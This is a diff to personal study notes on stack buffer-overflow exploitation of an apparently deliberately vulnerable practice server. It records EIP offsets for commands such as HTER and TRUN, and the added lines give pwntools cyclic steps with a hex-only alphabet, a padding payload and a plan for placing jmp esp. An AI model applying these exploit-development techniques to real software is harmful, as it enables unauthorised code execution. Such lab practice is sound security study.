@@ -29,7 +29,21 @@
              size 20x8=160                 ==> offset : 151 , varified   >>>> successful to jmp esp & executed \x90s; but exploit broken; <<unknown command>>
              
         3==> HTER 
-             size 300x7=2100               ==> can't understand , could be broken with 2109,2209 byte "A" but not with 2109,2209 byte pattern
+             size 300x7=2100               ==> ==> ==> *Direct use sent data in register without converting in of ASCII encodes; 
+                                                       *** custom pattern should be used :::: pwd;pip
+                                                       >>> python -i
+                                                       >>> from pwn import cyclic
+                                                       >>> cyclic(length=5000, alphabet = "12356789ABCDEF")
+                                                       ==> get the pattern ; send and get D913D813 
+                                                       ==> break in D9 13 D8 13 ; reverse it to 13 D8 13 D9
+                                                       ==> find offset  
+                                                       >>> cyclic_find("13D813D9", alphabet = "12356789ABCDEF")
+                                                       ==> ==> offset is : 2041
+                                                       ==> send "A"*2041 + "BCDEFBCD"  *** only HEX Chars 
+                                                       ==> on EIP that place as   CD FB DE CB     ==> REVERSED IN 2CHAR GROUP
+                                                       ==> now have to place jmp_esp but without making ASCII rep; just reverse it only
+                                                       ==> use -f hex ; hex format payload
+                                                       
         
         4==> "TRUN ."                      
              size 100x19=1900              ==> offset : 2006 &  buffer size must be > 4000 to write on EIP , << Gives non broking shell code: SUCCESS >> ***
